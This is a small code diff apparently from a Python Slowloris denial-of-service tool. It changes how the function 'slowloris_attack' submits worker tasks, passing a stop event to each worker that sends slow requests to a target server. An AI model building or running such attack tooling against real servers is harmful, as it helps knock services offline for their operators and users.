@@ -41,7 +41,7 @@ def slowloris_attack(target: str, port: int, timeout: float, workers: int):
 
     try:
         for _ in range(workers):
-            executor.submit(_send_slowloris_request, target, port, timeout)
+            executor.submit(_send_slowloris_request, target, port, timeout, executor.stop_event)
         while True:
             time.sleep(1)  # Keep the main thread alive
     except KeyboardInterrupt:
